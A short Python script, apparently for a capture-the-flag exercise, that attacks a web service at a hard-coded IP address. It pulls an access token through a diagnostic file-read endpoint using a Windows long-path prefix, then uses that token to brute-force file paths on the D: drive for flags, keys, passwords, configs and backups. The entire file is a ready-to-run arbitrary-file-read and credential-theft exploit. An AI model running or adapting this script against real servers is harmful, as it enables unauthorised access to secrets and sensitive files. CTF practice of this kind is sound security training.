import requests

BASE_URL = "http://1.95.51.2:8080"

def get_token():
    try:
        r = requests.get(f"{BASE_URL}/api/diag/read", params={"path": r"\\?\C:\token\access_key.txt"}, timeout=5)
        if r.status_code == 200:
            return r.json().get("token")
    except:
        pass
    return None

def check(path):
    t = get_token()
    if not t: return
    try:
        r = requests.get(f"{BASE_URL}/api/export/read", params={"path": path, "token": t}, timeout=5)
        print(f"Path: {path} -> {r.status_code}")
    except:
        pass

if __name__ == "__main__":
    words = [
        "flag", "Flag", "FLAG", "flag.txt", "Flag.txt", "FLAG.TXT",
        "secret", "Secret.txt", "key", "access_key", "password",
        "backup", "backup.txt", "data", "conf", "config",
        "172.20.0.10", "share", "export", "stage2",
        "readme", "todo", "admin", "root", "user"
    ]
    suffixes = ["", ".txt", ".key", ".log", ".bak", ".ini"]
    
    for w in words:
        for s in suffixes:
            f = w + s
            check(fr"\\?\D:\{f}")
            check(fr"\\?\D:\backup\{f}")
